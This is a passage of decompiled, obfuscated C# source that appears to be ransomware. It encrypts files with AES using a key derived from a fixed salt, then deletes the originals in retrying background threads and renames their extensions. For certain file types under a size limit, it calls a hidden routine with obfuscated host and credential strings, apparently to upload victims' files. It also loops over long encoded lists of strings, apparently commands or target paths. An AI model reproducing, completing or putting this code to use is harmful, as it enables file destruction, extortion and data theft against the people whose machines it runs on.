							aDJKTHVvtfISh.AUzNYWrxJKEB(getString_0(107401454), getString_0(107401449), getString_0(107401404), LtvKgfEVcSogMP);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (LtvKgfEVcSogMP != qJpyoyVReBm)
		{
			File.Move(LtvKgfEVcSogMP, qJpyoyVReBm);
			LtvKgfEVcSogMP = qJpyoyVReBm;
		}
		byte[] bytes = mLvAvjKKGJxbb.RlhTeYZQFxqeS(File.ReadAllBytes(LtvKgfEVcSogMP), RJNJFFgWFahM, ABDTpiKMipMNp);
		File.WriteAllBytes(LtvKgfEVcSogMP, bytes);
		DPjjDEUnrYJ++;
	}

	private static void gPkUEdrnpNAX(string string_0, string string_1, byte[] byte_0)
	{
		LerVzbXIIhQ CS_0024_003C_003E8__locals0 = new LerVzbXIIhQ();
		CS_0024_003C_003E8__locals0.JgoRvgBlnpx = string_0;
		CS_0024_003C_003E8__locals0.pnnxcTqhyFOc = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string pnnxcTqhyFOc = CS_0024_003C_003E8__locals0.pnnxcTqhyFOc;
			FileStream fileStream = new FileStream(pnnxcTqhyFOc, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (RrpEvBQBLONZKo == getString_0(107396816))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.JgoRvgBlnpx, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.JgoRvgBlnpx, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.JgoRvgBlnpx, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.pnnxcTqhyFOc.Length > 0)
				{
					if (pRibgXhmfietto == getString_0(107396816))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.JgoRvgBlnpx, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in tnUDcbYyevrzGRJA)
						{
							if (CS_0024_003C_003E8__locals0.JgoRvgBlnpx.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396816))
							{
								if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										aDJKTHVvtfISh.AUzNYWrxJKEB(getString_0(107401454), getString_0(107401449), getString_0(107401404), CS_0024_003C_003E8__locals0.JgoRvgBlnpx);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.JgoRvgBlnpx.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396382))
							{
								try
								{
									aDJKTHVvtfISh.AUzNYWrxJKEB(getString_0(107401454), getString_0(107401449), getString_0(107401404), CS_0024_003C_003E8__locals0.JgoRvgBlnpx);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.JgoRvgBlnpx);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.pnnxcTqhyFOc.EndsWith(getString_0(107398281)))
					{
						File.Move(CS_0024_003C_003E8__locals0.pnnxcTqhyFOc, CS_0024_003C_003E8__locals0.pnnxcTqhyFOc.Replace(getString_0(107398281), getString_0(107401341)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.pnnxcTqhyFOc))
							{
								File.Delete(CS_0024_003C_003E8__locals0.pnnxcTqhyFOc);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(bDDJFCkjBbYQ, getString_0(107399026) + CS_0024_003C_003E8__locals0.JgoRvgBlnpx + getString_0(107398272) + ex2.Message + getString_0(107395924));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> source = tKhSHdXkDw;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
			{
				HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107398731)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		List<string> fcllHXSYzCkoLu = FcllHXSYzCkoLu;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107398686)), string_0);
			};
		}
		Parallel.ForEach(fcllHXSYzCkoLu, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		if (XxUTdtdLXHJQFmlnR == getString_0(107396816))
		{
			string[] source2 = upziyoWzyCa;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107398686)), getString_0(107398693) + string_0 + getString_0(107398652));
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		if (!znndCnnZrNYoVh().Contains(getString_0(107398412)))
		{
			fBleBDBVVYJJ(fJgPhlsQHtYagv);
		}
		else
		{
			List<string> mRwbBvIEaNYw = MRwbBvIEaNYw;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					HnVlWPPowq(sNXkawcfFmeqKOWI(UIqHgaUGjSA(getString_0(107398647))), string_0);
				};
			}
			Parallel.ForEach(mRwbBvIEaNYw, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		List<string> kIKFUpmawnRBIE = KIKFUpmawnRBIE;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107398622)), string_0);
			};
		}
		Parallel.ForEach(kIKFUpmawnRBIE, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107398731)), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107398686)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107398686)), getString_0(107398693) + string_0 + getString_0(107398652));
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		HnVlWPPowq(sNXkawcfFmeqKOWI(UIqHgaUGjSA(getString_0(107398647))), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107398622)), string_0);
	}

	static cQHVlxVivZVq()
	{
		Strings.CreateGetStringDelegate(typeof(cQHVlxVivZVq));
		mkgreXsNDfWo = getString_0(107400992);
		nQCMwcWKyQk = null;
		QotWPeyjvzjx = getString_0(107396382);
		FoLsSeMcEVuV = getString_0(107398637);
		eaZULefnOUcJVI = new List<string>();
		DWWiJyUdyGLZ = new List<string>();
		mNPIOHsqKQLjYmM = getString_0(107396382);
		OxsDDfqLEi = getString_0(107401341);
		lXgIUpLgAi = getString_0(107401341);
		GThDVKInjH = getString_0(107401341);
		utoTLqCAZdXAT = getString_0(107396382);
		HxkcxNLXyTDaNa = 0;
		NgbDiBVJKDTW = getString_0(107396382);
		yyZHaDaxUisnQ = getString_0(107396382);
		bLsbDQXmZdNKY = getString_0(107396382);
		gRvYTwveWAbrj = getString_0(107398624);
		aYGZeCWKzRZALiE = getString_0(107396382);
		xssnOTnwBJDngh = getString_0(107396382);
		AUaVXVYfCAD = getString_0(107396382);
		DdPuPlUptL = getString_0(107396382);
		ZislTiThZFHv = new List<string>
		{
			sNXkawcfFmeqKOWI(getString_0(107398587)),
			sNXkawcfFmeqKOWI(getString_0(107398602)),
			sNXkawcfFmeqKOWI(getString_0(107398545)),
			sNXkawcfFmeqKOWI(getString_0(107398560)),
			sNXkawcfFmeqKOWI(getString_0(107398535)),
			sNXkawcfFmeqKOWI(getString_0(107397998)),
			sNXkawcfFmeqKOWI(getString_0(107397949)),
			sNXkawcfFmeqKOWI(getString_0(107397956)),
			sNXkawcfFmeqKOWI(getString_0(107397931)),
			sNXkawcfFmeqKOWI(getString_0(107397874)),
			sNXkawcfFmeqKOWI(getString_0(107397889)),
			sNXkawcfFmeqKOWI(getString_0(107397864)),
			sNXkawcfFmeqKOWI(getString_0(107397839))
		};
		IDUZlSGaIfn = new List<string>();
		XaypzBwanzwZ = getString_0(107396382);
		EopvfOZJdoX = getString_0(107396382);
		bGtevrhmXNGWmrdhzSx = getString_0(107396382);
		JEkdiihxCoWf = new List<string>();
		HohHoEgJewvBWz = getString_0(107396382);
		JNWYtfmGycaH = getString_0(107397782);
		gsXyoeFOorGZ = getString_0(107396382);
		vNvhWDXlFGgZo = getString_0(107396382);
		SoVrjAqLQHDY = new List<string>
		{
			sNXkawcfFmeqKOWI(getString_0(107397765)),
			sNXkawcfFmeqKOWI(getString_0(107398244)),
			sNXkawcfFmeqKOWI(getString_0(107398211)),
			sNXkawcfFmeqKOWI(getString_0(107398178)),
			sNXkawcfFmeqKOWI(getString_0(107398145)),
			sNXkawcfFmeqKOWI(getString_0(107398116)),
			sNXkawcfFmeqKOWI(getString_0(107398059)),
			sNXkawcfFmeqKOWI(getString_0(107398030)),
			sNXkawcfFmeqKOWI(getString_0(107397473)),
			sNXkawcfFmeqKOWI(getString_0(107397408)),
			sNXkawcfFmeqKOWI(getString_0(107397343)),
			sNXkawcfFmeqKOWI(getString_0(107397310)),
			sNXkawcfFmeqKOWI(getString_0(107397277)),
			sNXkawcfFmeqKOWI(getString_0(107397280)),
			sNXkawcfFmeqKOWI(getString_0(107397251)),
			sNXkawcfFmeqKOWI(getString_0(107397690)),
			sNXkawcfFmeqKOWI(getString_0(107397649)),
			sNXkawcfFmeqKOWI(getString_0(107397592)),
			sNXkawcfFmeqKOWI(getString_0(107397575)),
			sNXkawcfFmeqKOWI(getString_0(107397542)),
			sNXkawcfFmeqKOWI(getString_0(107397513)),
			sNXkawcfFmeqKOWI(getString_0(107364192)),
			sNXkawcfFmeqKOWI(getString_0(107364119)),
			sNXkawcfFmeqKOWI(getString_0(107364086)),
			sNXkawcfFmeqKOWI(getString_0(107364069)),
			sNXkawcfFmeqKOWI(getString_0(107364012)),
			sNXkawcfFmeqKOWI(getString_0(107363971)),
			sNXkawcfFmeqKOWI(getString_0(107364454)),
			sNXkawcfFmeqKOWI(getString_0(107364381)),
			sNXkawcfFmeqKOWI(getString_0(107364356)),
			sNXkawcfFmeqKOWI(getString_0(107364291)),
			sNXkawcfFmeqKOWI(getString_0(107364234)),
			sNXkawcfFmeqKOWI(getString_0(107363657)),
			sNXkawcfFmeqKOWI(getString_0(107363576)),
			sNXkawcfFmeqKOWI(getString_0(107363511)),
			sNXkawcfFmeqKOWI(getString_0(107363454)),
			sNXkawcfFmeqKOWI(getString_0(107363933)),
			sNXkawcfFmeqKOWI(getString_0(107363892)),
			sNXkawcfFmeqKOWI(getString_0(107363883)),
			sNXkawcfFmeqKOWI(getString_0(107363806)),
			sNXkawcfFmeqKOWI(getString_0(107363809)),
			sNXkawcfFmeqKOWI(getString_0(107363744)),
			sNXkawcfFmeqKOWI(getString_0(107363159)),
			sNXkawcfFmeqKOWI(getString_0(107363126)),
			sNXkawcfFmeqKOWI(getString_0(107363117)),
			sNXkawcfFmeqKOWI(getString_0(107363036)),
			sNXkawcfFmeqKOWI(getString_0(107363023)),
			sNXkawcfFmeqKOWI(getString_0(107362950)),
			sNXkawcfFmeqKOWI(getString_0(107363385)),
			sNXkawcfFmeqKOWI(getString_0(107363372)),
			sNXkawcfFmeqKOWI(getString_0(107363295)),
			sNXkawcfFmeqKOWI(getString_0(107363254)),
			sNXkawcfFmeqKOWI(getString_0(107363213)),
			sNXkawcfFmeqKOWI(getString_0(107362640)),
			sNXkawcfFmeqKOWI(getString_0(107362631)),
			sNXkawcfFmeqKOWI(getString_0(107362566)),
			sNXkawcfFmeqKOWI(getString_0(107362489)),
			sNXkawcfFmeqKOWI(getString_0(107362460)),
			sNXkawcfFmeqKOWI(getString_0(107362447)),
			sNXkawcfFmeqKOWI(getString_0(107362894)),
			sNXkawcfFmeqKOWI(getString_0(107362833)),
			sNXkawcfFmeqKOWI(getString_0(107362776)),
			sNXkawcfFmeqKOWI(getString_0(107362711)),
			sNXkawcfFmeqKOWI(getString_0(107362702)),
			sNXkawcfFmeqKOWI(getString_0(107362129)),
			sNXkawcfFmeqKOWI(getString_0(107362120)),
			sNXkawcfFmeqKOWI(getString_0(107362007)),
			sNXkawcfFmeqKOWI(getString_0(107361946)),
			sNXkawcfFmeqKOWI(getString_0(107362385)),
			sNXkawcfFmeqKOWI(getString_0(107362372)),
			sNXkawcfFmeqKOWI(getString_0(107362339)),
			sNXkawcfFmeqKOWI(getString_0(107362266)),
			sNXkawcfFmeqKOWI(getString_0(107362221)),
			sNXkawcfFmeqKOWI(getString_0(107362176)),
			sNXkawcfFmeqKOWI(getString_0(107361575)),
			sNXkawcfFmeqKOWI(getString_0(107361494)),
			sNXkawcfFmeqKOWI(getString_0(107361465)),
			sNXkawcfFmeqKOWI(getString_0(107361424)),
			sNXkawcfFmeqKOWI(getString_0(107361903)),
			sNXkawcfFmeqKOWI(getString_0(107361822)),
			sNXkawcfFmeqKOWI(getString_0(107361797)),
			sNXkawcfFmeqKOWI(getString_0(107361764)),
			sNXkawcfFmeqKOWI(getString_0(107361703)),
			sNXkawcfFmeqKOWI(getString_0(107361134)),
			sNXkawcfFmeqKOWI(getString_0(107363454)),
			sNXkawcfFmeqKOWI(getString_0(107361045)),
			sNXkawcfFmeqKOWI(getString_0(107361036)),
			sNXkawcfFmeqKOWI(getString_0(107360915)),
			sNXkawcfFmeqKOWI(getString_0(107360902)),
			sNXkawcfFmeqKOWI(getString_0(107361353)),
			sNXkawcfFmeqKOWI(getString_0(107361296)),
			sNXkawcfFmeqKOWI(getString_0(107361283)),
			sNXkawcfFmeqKOWI(getString_0(107361202)),
			sNXkawcfFmeqKOWI(getString_0(107364356)),
			sNXkawcfFmeqKOWI(getString_0(107361137)),
			sNXkawcfFmeqKOWI(getString_0(107360616)),
			sNXkawcfFmeqKOWI(getString_0(107360559)),
			sNXkawcfFmeqKOWI(getString_0(107364291)),
			sNXkawcfFmeqKOWI(getString_0(107360486)),
			sNXkawcfFmeqKOWI(getString_0(107360405)),
			sNXkawcfFmeqKOWI(getString_0(107360828)),
			sNXkawcfFmeqKOWI(getString_0(107360763)),
			sNXkawcfFmeqKOWI(getString_0(107360746)),
			sNXkawcfFmeqKOWI(getString_0(107363657)),
			sNXkawcfFmeqKOWI(getString_0(107360637)),
			sNXkawcfFmeqKOWI(getString_0(107363933)),
			sNXkawcfFmeqKOWI(getString_0(107363576)),
			sNXkawcfFmeqKOWI(getString_0(107360092)),
			sNXkawcfFmeqKOWI(getString_0(107360067)),
			sNXkawcfFmeqKOWI(getString_0(107363511)),
			sNXkawcfFmeqKOWI(getString_0(107360034)),
			sNXkawcfFmeqKOWI(getString_0(107359953)),
			sNXkawcfFmeqKOWI(getString_0(107359936)),
			sNXkawcfFmeqKOWI(getString_0(107364381)),
			sNXkawcfFmeqKOWI(getString_0(107359911)),
			sNXkawcfFmeqKOWI(getString_0(107360346)),
			sNXkawcfFmeqKOWI(getString_0(107360317)),
			sNXkawcfFmeqKOWI(getString_0(107360320)),
			sNXkawcfFmeqKOWI(getString_0(107360243)),
			sNXkawcfFmeqKOWI(getString_0(107360210)),
			sNXkawcfFmeqKOWI(getString_0(107360185)),
			sNXkawcfFmeqKOWI(getString_0(107360172)),
			sNXkawcfFmeqKOWI(getString_0(107360115)),
			sNXkawcfFmeqKOWI(getString_0(107359594)),
			sNXkawcfFmeqKOWI(getString_0(107359517)),
			sNXkawcfFmeqKOWI(getString_0(107359500)),
			sNXkawcfFmeqKOWI(getString_0(107359411)),
			sNXkawcfFmeqKOWI(getString_0(107359378)),
			sNXkawcfFmeqKOWI(getString_0(107359365)),
			sNXkawcfFmeqKOWI(getString_0(107359844)),
			sNXkawcfFmeqKOWI(getString_0(107359771)),
			sNXkawcfFmeqKOWI(getString_0(107364454)),
			sNXkawcfFmeqKOWI(getString_0(107359500)),
			sNXkawcfFmeqKOWI(getString_0(107359730)),
			sNXkawcfFmeqKOWI(getString_0(107359701)),
			sNXkawcfFmeqKOWI(getString_0(107359672)),
			sNXkawcfFmeqKOWI(getString_0(107359655)),
			sNXkawcfFmeqKOWI(getString_0(107359070)),
			sNXkawcfFmeqKOWI(getString_0(107359041)),
			sNXkawcfFmeqKOWI(getString_0(107358936)),
			sNXkawcfFmeqKOWI(getString_0(107358907)),
			sNXkawcfFmeqKOWI(getString_0(107358874)),
			sNXkawcfFmeqKOWI(getString_0(107359313)),
			sNXkawcfFmeqKOWI(getString_0(107359284)),
			sNXkawcfFmeqKOWI(getString_0(107359271)),
			sNXkawcfFmeqKOWI(getString_0(107359206)),
			sNXkawcfFmeqKOWI(getString_0(107359173)),
			sNXkawcfFmeqKOWI(getString_0(107359096)),
			sNXkawcfFmeqKOWI(getString_0(107358523)),
			sNXkawcfFmeqKOWI(getString_0(107358490)),
			sNXkawcfFmeqKOWI(getString_0(107358477)),
			sNXkawcfFmeqKOWI(getString_0(107358412)),
			sNXkawcfFmeqKOWI(getString_0(107358379)),
			sNXkawcfFmeqKOWI(getString_0(107358338)),
			sNXkawcfFmeqKOWI(getString_0(107358769)),
			sNXkawcfFmeqKOWI(getString_0(107364069)),
			sNXkawcfFmeqKOWI(getString_0(107358740)),
			sNXkawcfFmeqKOWI(getString_0(107358683)),
			sNXkawcfFmeqKOWI(getString_0(107358642)),
			sNXkawcfFmeqKOWI(getString_0(107358629)),
			sNXkawcfFmeqKOWI(getString_0(107358044)),
			sNXkawcfFmeqKOWI(getString_0(107358031)),
			sNXkawcfFmeqKOWI(getString_0(107357938)),
			sNXkawcfFmeqKOWI(getString_0(107357921)),
			sNXkawcfFmeqKOWI(getString_0(107357840)),
			sNXkawcfFmeqKOWI(getString_0(107358295)),
			sNXkawcfFmeqKOWI(getString_0(107358238)),
			sNXkawcfFmeqKOWI(getString_0(107358193)),
			sNXkawcfFmeqKOWI(getString_0(107358184)),
			sNXkawcfFmeqKOWI(getString_0(107358127)),
			sNXkawcfFmeqKOWI(getString_0(107364012)),
			sNXkawcfFmeqKOWI(getString_0(107357542)),
			sNXkawcfFmeqKOWI(getString_0(107357513)),
			sNXkawcfFmeqKOWI(getString_0(107357480)),
			sNXkawcfFmeqKOWI(getString_0(107357407)),
			sNXkawcfFmeqKOWI(getString_0(107357410)),
			sNXkawcfFmeqKOWI(getString_0(107364086)),
			sNXkawcfFmeqKOWI(getString_0(107357337)),
			sNXkawcfFmeqKOWI(getString_0(107357320)),
			sNXkawcfFmeqKOWI(getString_0(107357803)),
			sNXkawcfFmeqKOWI(getString_0(107362833)),
			sNXkawcfFmeqKOWI(getString_0(107357770)),
			sNXkawcfFmeqKOWI(getString_0(107357803)),
			sNXkawcfFmeqKOWI(getString_0(107357741)),
			sNXkawcfFmeqKOWI(getString_0(107357680)),
			sNXkawcfFmeqKOWI(getString_0(107357651)),
			sNXkawcfFmeqKOWI(getString_0(107357634)),
			sNXkawcfFmeqKOWI(getString_0(107357553)),
			sNXkawcfFmeqKOWI(getString_0(107357032)),
			sNXkawcfFmeqKOWI(getString_0(107356971)),
			sNXkawcfFmeqKOWI(getString_0(107356942)),
			sNXkawcfFmeqKOWI(getString_0(107356901)),
			sNXkawcfFmeqKOWI(getString_0(107356824)),
			sNXkawcfFmeqKOWI(getString_0(107356811)),
			sNXkawcfFmeqKOWI(getString_0(107357290)),
			sNXkawcfFmeqKOWI(getString_0(107357201)),
			sNXkawcfFmeqKOWI(getString_0(107357188)),
			sNXkawcfFmeqKOWI(getString_0(107357131)),
			sNXkawcfFmeqKOWI(getString_0(107357098)),
			sNXkawcfFmeqKOWI(getString_0(107357057)),
			sNXkawcfFmeqKOWI(getString_0(107356516)),
			sNXkawcfFmeqKOWI(getString_0(107356455)),
			sNXkawcfFmeqKOWI(getString_0(107356422)),
			sNXkawcfFmeqKOWI(getString_0(107356365)),
			sNXkawcfFmeqKOWI(getString_0(107356324)),
			sNXkawcfFmeqKOWI(getString_0(107356755)),
			sNXkawcfFmeqKOWI(getString_0(107356722)),
			sNXkawcfFmeqKOWI(getString_0(107356705)),
			sNXkawcfFmeqKOWI(getString_0(107356628)),
			sNXkawcfFmeqKOWI(getString_0(107356611)),
			sNXkawcfFmeqKOWI(getString_0(107356534)),
			sNXkawcfFmeqKOWI(getString_0(107356005)),
			sNXkawcfFmeqKOWI(getString_0(107355972)),
			sNXkawcfFmeqKOWI(getString_0(107355899)),
			sNXkawcfFmeqKOWI(getString_0(107355858)),
			sNXkawcfFmeqKOWI(getString_0(107355845)),
			sNXkawcfFmeqKOWI(getString_0(107359070)),
			sNXkawcfFmeqKOWI(getString_0(107355812)),
			sNXkawcfFmeqKOWI(getString_0(107356251)),
			sNXkawcfFmeqKOWI(getString_0(107356226)),
			sNXkawcfFmeqKOWI(getString_0(107356197)),
			sNXkawcfFmeqKOWI(getString_0(107356164)),
			sNXkawcfFmeqKOWI(getString_0(107356131)),
			sNXkawcfFmeqKOWI(getString_0(107356050)),
			sNXkawcfFmeqKOWI(getString_0(107356021)),
			sNXkawcfFmeqKOWI(getString_0(107355496)),
			sNXkawcfFmeqKOWI(getString_0(107355419)),
			sNXkawcfFmeqKOWI(getString_0(107355378)),
			sNXkawcfFmeqKOWI(getString_0(107355321)),
			sNXkawcfFmeqKOWI(getString_0(107355304)),
			sNXkawcfFmeqKOWI(getString_0(107355275)),
			sNXkawcfFmeqKOWI(getString_0(107355710))
		};
		tKhSHdXkDw = new List<string>
		{
			sNXkawcfFmeqKOWI(getString_0(107355669)),
			sNXkawcfFmeqKOWI(getString_0(107355652)),
			sNXkawcfFmeqKOWI(getString_0(107355571)),
			sNXkawcfFmeqKOWI(getString_0(107355554)),
			sNXkawcfFmeqKOWI(getString_0(107354961)),
			sNXkawcfFmeqKOWI(getString_0(107354896)),
			sNXkawcfFmeqKOWI(getString_0(107354851)),
			sNXkawcfFmeqKOWI(getString_0(107354790))
		};
		FcllHXSYzCkoLu = new List<string>
		{
			sNXkawcfFmeqKOWI(getString_0(107355245)),
			sNXkawcfFmeqKOWI(getString_0(107355212)),
			sNXkawcfFmeqKOWI(getString_0(107355135)),
			sNXkawcfFmeqKOWI(getString_0(107355118)),
			sNXkawcfFmeqKOWI(getString_0(107355085)),
			sNXkawcfFmeqKOWI(getString_0(107355004)),
			sNXkawcfFmeqKOWI(getString_0(107354479)),
			sNXkawcfFmeqKOWI(getString_0(107354446)),
			sNXkawcfFmeqKOWI(getString_0(107354413)),
			sNXkawcfFmeqKOWI(getString_0(107354380)),
			sNXkawcfFmeqKOWI(getString_0(107354347)),
			sNXkawcfFmeqKOWI(getString_0(107354314)),
			sNXkawcfFmeqKOWI(getString_0(107354273)),
			sNXkawcfFmeqKOWI(getString_0(107354712)),
			sNXkawcfFmeqKOWI(getString_0(107354699)),
			sNXkawcfFmeqKOWI(getString_0(107354666)),
			sNXkawcfFmeqKOWI(getString_0(107354625)),
			sNXkawcfFmeqKOWI(getString_0(107354592)),
			sNXkawcfFmeqKOWI(getString_0(107354519)),
			sNXkawcfFmeqKOWI(getString_0(107354510)),
			sNXkawcfFmeqKOWI(getString_0(107353965)),
			sNXkawcfFmeqKOWI(getString_0(107353924)),
			sNXkawcfFmeqKOWI(getString_0(107353891)),
			sNXkawcfFmeqKOWI(getString_0(107355245)),
			sNXkawcfFmeqKOWI(getString_0(107353818)),
			sNXkawcfFmeqKOWI(getString_0(107353777)),
			sNXkawcfFmeqKOWI(getString_0(107353764)),
			sNXkawcfFmeqKOWI(getString_0(107353731)),
			sNXkawcfFmeqKOWI(getString_0(107354170)),
			sNXkawcfFmeqKOWI(getString_0(107354129)),
			sNXkawcfFmeqKOWI(getString_0(107354096)),
			sNXkawcfFmeqKOWI(getString_0(107354087)),
			sNXkawcfFmeqKOWI(getString_0(107354014)),
			sNXkawcfFmeqKOWI(getString_0(107355212)),
			sNXkawcfFmeqKOWI(getString_0(107353973)),
			sNXkawcfFmeqKOWI(getString_0(107355135)),
			sNXkawcfFmeqKOWI(getString_0(107353428)),
			sNXkawcfFmeqKOWI(getString_0(107353395)),
			sNXkawcfFmeqKOWI(getString_0(107353386)),
			sNXkawcfFmeqKOWI(getString_0(107353353)),
			sNXkawcfFmeqKOWI(getString_0(107353312)),
			sNXkawcfFmeqKOWI(getString_0(107353239)),
			sNXkawcfFmeqKOWI(getString_0(107353206)),
			sNXkawcfFmeqKOWI(getString_0(107353685)),
			sNXkawcfFmeqKOWI(getString_0(107353676)),
			sNXkawcfFmeqKOWI(getString_0(107353635)),
			sNXkawcfFmeqKOWI(getString_0(107353562))
		};
		MRwbBvIEaNYw = new List<string>
		{
			sNXkawcfFmeqKOWI(UIqHgaUGjSA(getString_0(107353521))),
			sNXkawcfFmeqKOWI(getString_0(107353504)),
			sNXkawcfFmeqKOWI(getString_0(107352899)),
			sNXkawcfFmeqKOWI(getString_0(107352802)),
			sNXkawcfFmeqKOWI(getString_0(107352709)),
			sNXkawcfFmeqKOWI(getString_0(107353124)),
			sNXkawcfFmeqKOWI(getString_0(107353031)),
			sNXkawcfFmeqKOWI(getString_0(107352422)),
			sNXkawcfFmeqKOWI(getString_0(107352329)),
			sNXkawcfFmeqKOWI(getString_0(107352232)),
			sNXkawcfFmeqKOWI(getString_0(107352651)),
			sNXkawcfFmeqKOWI(getString_0(107352554)),
			sNXkawcfFmeqKOWI(getString_0(107352461)),
			sNXkawcfFmeqKOWI(UIqHgaUGjSA(getString_0(107353521)))
		};
		fJgPhlsQHtYagv = sNXkawcfFmeqKOWI(getString_0(107351852));
		KIKFUpmawnRBIE = new List<string>
		{
			sNXkawcfFmeqKOWI(getString_0(107351707)),
			sNXkawcfFmeqKOWI(getString_0(107352025)),
			sNXkawcfFmeqKOWI(getString_0(107351319)),
			sNXkawcfFmeqKOWI(getString_0(107351637)),
			sNXkawcfFmeqKOWI(getString_0(107351443)),
			sNXkawcfFmeqKOWI(getString_0(107350737))
		};
		WjopLCEDSl = new List<string>
		{
			sNXkawcfFmeqKOWI(getString_0(107351087)),
			sNXkawcfFmeqKOWI(getString_0(107350994)),
			sNXkawcfFmeqKOWI(getString_0(107350933))
		};
		dNiPJscrdZ = getString_0(107396382);
		pRwaCpJBKvM = getString_0(107396382);
		AiPmmCrNxON = new DateTime(2000, 1, 1);
		TyxvmRxEqTldBX = new DateTime(2100, 1, 1);
		krdgQbbXWsBnkAs = getString_0(107396816);
		bQealBkUmzhp = getString_0(107398383);
		IjKkEPdMxTo = getString_0(107396382);
		SsLdaQJOERuN = getString_0(107396382);
		zCYQvPmGdWb = getString_0(107396382);
		SwTuLSeNkXgX = getString_0(107396816);
		GZbePnAiKIwM = getString_0(107396382);
		pRibgXhmfietto = getString_0(107396382);
		tnUDcbYyevrzGRJA = new List<string>
		{
			getString_0(107396056),
			getString_0(107395258),
			getString_0(107396090),
			getString_0(107395683)
		};
		OGIisKmpnCtjYJtSZ = getString_0(107396382);
		dKLzVpzOOKvyJbR = getString_0(107350360);
		HmOIvziEgj = getString_0(107396382);
		wWsTKhWTnA = getString_0(107396382);
		ceBfodBwRY = getString_0(107396382);
		YrUNJYkfZORc = string.Empty;
